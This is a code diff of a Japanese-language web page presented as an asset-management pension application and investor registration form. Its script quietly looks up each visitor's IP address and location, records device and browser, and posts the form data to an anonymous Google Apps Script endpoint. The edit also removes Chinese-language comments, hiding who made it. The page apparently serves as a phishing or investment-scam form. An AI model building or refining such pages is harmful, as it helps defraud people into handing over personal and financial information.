@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="ja>
+<html lang="ja">
 <head>
 <meta charset="UTF-8">
-<title>資産運用プランB
-年金プラン申請書</title>
+<title>資産運用プランB - 年金プラン申請書</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -18,9 +17,10 @@ margin:0;
 background:#0b3a63;
 color:white;
 text-align:center;
-padding:18px;
+padding:20px;
 font-size:22px;
 font-weight:bold;
+line-height:1.6;
 }
 
 .container{
@@ -72,6 +72,11 @@ border:none;
 border-radius:6px;
 font-size:18px;
 cursor:pointer;
+transition:0.3s;
+}
+
+button:hover{
+background:#09406f;
 }
 
 .footer{
@@ -86,7 +91,10 @@ text-align:center;
 
 <body>
 
-<div class="header">公式投資家登録フォーム</div>
+<div class="header">
+資産運用プランB<br>
+年金プラン申請書
+</div>
 
 <div class="container">
 
@@ -145,23 +153,32 @@ text-align:center;
 // Google Script API
 const scriptURL="https://script.google.com/macros/s/AKfycbz8d0bNSaEIC2saHWx_sKZLhVgvF34FevV70sCKRk5vjsD5x2QwAz2yD1txUSsfvO_tiQ/exec"
 
-// 客户信息变量
 let clientIP=""
 let clientCountry=""
 let clientCity=""
 
-// 获取IP和地区
-fetch("https://ipapi.co/json/")
-.then(res=>res.json())
-.then(data=>{
+// 获取IP
+async function loadIP(){
+
+try{
+
+const res=await fetch("https://ipapi.co/json/")
+const data=await res.json()
 
 clientIP=data.ip
 clientCountry=data.country_name
 clientCity=data.city
 
-})
+}catch(e){
 
-// 获取设备
+console.log("IP取得失敗")
+
+}
+
+}
+
+loadIP()
+
 function getDevice(){
 
 const ua=navigator.userAgent
@@ -171,7 +188,6 @@ return "Desktop"
 
 }
 
-// 获取浏览器
 function getBrowser(){
 
 const ua=navigator.userAgent
@@ -184,22 +200,16 @@ return "Unknown"
 
 }
 
-
 document.getElementById("registrationForm").addEventListener("submit",function(e){
 
 e.preventDefault()
 
 const formData=new FormData(this)
 
-//客户编号
 formData.append("client_id","C"+Date.now())
-
-//IP信息
 formData.append("ip",clientIP)
 formData.append("country",clientCountry)
 formData.append("city",clientCity)
-
-//设备信息
 formData.append("device",getDevice())
 formData.append("browser",getBrowser())
 
